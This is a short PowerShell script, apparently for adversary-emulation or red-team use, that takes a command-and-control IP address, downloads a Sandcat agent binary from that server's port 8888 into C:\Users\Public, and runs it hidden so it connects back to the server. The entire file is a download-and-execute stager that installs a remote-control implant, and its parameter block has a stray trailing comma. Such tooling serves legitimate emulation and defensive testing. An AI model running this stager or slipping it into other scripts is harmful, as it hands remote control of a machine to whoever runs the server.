# Author: Roberto Rodriguez (@Cyb3rWard0g)
# License: GPL-3.0

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$C2IPAddress,
)

$url="http://$C2IPAddress`:8888/file/download"
$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$output="C:\Users\Public\sandcat.exe"
$wc.DownloadFile($url,$output)

powershell.exe -noP -sta -w 1 -command "C:\Users\Public\sandcat.exe -server http://$C2IPAddress`:8888 -group my_group"